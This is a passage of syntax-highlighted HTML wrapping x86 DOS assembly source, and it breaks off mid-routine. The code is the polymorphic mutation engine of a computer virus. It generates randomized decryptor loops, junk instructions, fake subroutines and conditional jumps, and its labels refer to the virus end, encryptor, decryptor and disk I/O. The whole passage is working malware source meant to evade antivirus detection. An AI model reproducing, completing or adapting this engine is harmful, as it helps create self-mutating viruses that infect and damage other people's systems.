 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Intersegment</span><span class="sc0">           </span><span class="sc1">; Jump for memory reference</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Overdrive</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get chosen 8-bit register</span><span class="sc0">
 </span><span class="sc6">sar</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; Divide by 8</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">                </span><span class="sc1">; Make it immediate operand</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Keybyte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)]</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Resemble</span><span class="sc0">

</span><span class="sc5">Intersegment</span><span class="sc4">:</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Keybyte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Compound</span><span class="sc0">               </span><span class="sc1">; Get segment prefix</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Overdrive</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get chosen byte register</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Mutant</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Resemble</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encoder</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">               </span><span class="sc1">; Multiply by 3</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Encoder</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Food</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Feed</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                 </span><span class="sc1">; ADC opcode?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Convince</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                 </span><span class="sc1">; SBB opcode?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Flush</span><span class="sc0">

</span><span class="sc5">Convince</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Decide</span><span class="sc0">                 </span><span class="sc1">; Choose either CLC or STC</span><span class="sc0">

</span><span class="sc5">Flush</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Compound</span><span class="sc0">               </span><span class="sc1">; Choose segment prefix</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Overdrive</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Displacement</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get displacement</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Decide</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; 0 or 1 ?</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">                </span><span class="sc1">; CLC/STC</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Interplay</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Bombshell</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Generate a pointer increment/decrement</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; It can be SUB SI,FFFF/ADD SI,FFFF/SUB DI,FFFF/</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Queer</span><span class="sc0">                  </span><span class="sc1">; ADD DI,FFFF/INC SI/DEC SI/INC DI/DEC DI/LODSB/</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C783h</span><span class="sc0">              </span><span class="sc1">; ADD DI,XXXX</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Swap SI/DI</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Direction</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">; Forward or backward?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Rising</span><span class="sc0">                 </span><span class="sc1">; Branch if backward</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                 </span><span class="sc1">; Change ADD to SUB</span><span class="sc0">

</span><span class="sc5">Rising</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">                </span><span class="sc1">; Only a byte?!? </span><span class="sc0">

</span><span class="sc5">Mainstay</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Queer</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FC47h</span><span class="sc0">              </span><span class="sc1">; CLD + INC  SI/DI</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Direction</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Backdoor</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0108h</span><span class="sc0">               </span><span class="sc1">; STD + DEC  SI/DI</span><span class="sc0">

</span><span class="sc5">Backdoor</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Mainstay</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AEh</span><span class="sc0">                </span><span class="sc1">; SCASB opcode</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Determine</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Else, it'd be LODSB</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Determine</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Countless</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Make a decryption loop but not use LOOPs</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Circular</span><span class="sc0">               </span><span class="sc1">; Use decrement or ADD XI,XXXX ??</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">744Eh</span><span class="sc0">               
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Distinguish</span><span class="sc0">

</span><span class="sc5">Circular</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; ADD SI,FFFF/ADD DI,FFFF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C683h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Resultant</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; SI/DI</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">74FFh</span><span class="sc0">               

</span><span class="sc5">Distinguish</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">ZeroLoop</span><span class="sc0">               </span><span class="sc1">; Turn JZ into JS/JL/JLE, they equal but JS &amp; JL</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                 </span><span class="sc1">; do one more excess loop, and the byte just</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">ZeroLoop</span><span class="sc0">               </span><span class="sc1">; before (last byte of buffer) or after (first</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7Ch</span><span class="sc0">                 </span><span class="sc1">; byte of decryptor) encrypted area ain't used.</span><span class="sc0">
 </span><span class="sc6">jp</span><span class="sc0">     </span><span class="sc5">ZeroLoop</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7Eh</span><span class="sc0">                 </span><span class="sc1">; JLE opcode</span><span class="sc0">

</span><span class="sc5">ZeroLoop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">scasb</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Total_Garbage</span><span class="sc0">          </span><span class="sc1">; Fill with garbage</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Construction</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">R_Bytes</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Make a decryption loop </span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Wind_it_up</span><span class="sc0">

</span><span class="sc5">Subroutine</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Create a subroutine in decryptor</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">
 </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">Unavailable</span><span class="sc0">            </span><span class="sc1">; A subroutine already built and not called yet?</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Construction</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">scasw</span><span class="sc0">                         </span><span class="sc1">; Preserve a word for jump displacement</span><span class="sc0">

</span><span class="sc5">Build_Return</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Total_Garbage</span><span class="sc0">          </span><span class="sc1">; Fill with junks</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Store a RETN</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Point DI to jump displacement</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; Subtract current offset from DI</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Subtract JMP displacement length too</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Store displacement</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Trash_Call</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Generate a call to subroutine</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">Unavailable</span><span class="sc0">            </span><span class="sc1">; Subroutine already built? branch if not</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; A near call</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; Calculate displacement</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">Nullify</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HiSiz</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">; Mark that there is no subroutine</span><span class="sc0">

</span><span class="sc5">Unavailable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Conditional</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Choose one of twenty conditional branches</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Lseek_BOF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fixup</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Disk_IO</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Unavailable</span><span class="sc0">            </span><span class="sc1">; Don't make it as first instruction</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0014h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Random number [0..20]</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; Test bit 4</span><span class="sc0">
 </span><span class="sc6">lahf</span><span class="sc0">                          </span><span class="sc1">; Store CF, ZF, SF, PF, and AF state into AH</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                 </span><span class="sc1">; Make it a conditional JMP</span><span class="sc0">
 </span><span class="sc6">sahf</span><span class="sc0">                          </span><span class="sc1">; Restore 6 flags</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Eventual</span><span class="sc0">               </span><span class="sc1">; Bit 4 isn't set? so use conditional jumps </span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">                 </span><span class="sc1">; MIA also uses LOOPZ/LOOPNZ/LOOP/JCXZ </span><span class="sc0">
                               </span><span class="sc1">; 'cos it's like a JMP that affects CX register</span><span class="sc0">
</span><span class="sc5">Eventual</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Put it</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">; Save displacement offset</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                     

</span><span class="sc5">Wind_it_up</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Total_Garbage</span><span class="sc0">          </span><span class="sc1">; Fill with garbage</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                         </span><span class="sc1">; Put displacement</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">Discontinue</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                      </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Mora</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">aut</span><span class="sc0"> </span><span class="sc5">honorabilis</span><span class="sc0"> </span><span class="sc5">vita</span><span class="sc0">!


</span><span class="sc5">Caller</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; Generate a call for decryptor parts</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">     
 </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">Discontinue</span><span class="sc0">            </span><span class="sc1">; Zero?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Pointer to decryptor building</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Remains the last part of decryptor?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Discontinue</span><span class="sc0">            </span><span class="sc1">; So branch</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Construction</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">; Save displacement offset</span><span class="sc0">
 </span><span class="sc6">scasw</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Total_Garbage</span><span class="sc0">          </span><span class="sc1">; Fill with trashes</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Entrance</span><span class="sc0">               </span><span class="sc1">; Put one decryptor instruction</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Build_Return</span><span class="sc0">     </span><span class="sc1">; Fill with garbage again</span><span class="sc0">

</span><span class="sc5">Total_Garbage</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; Create some rubbish</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
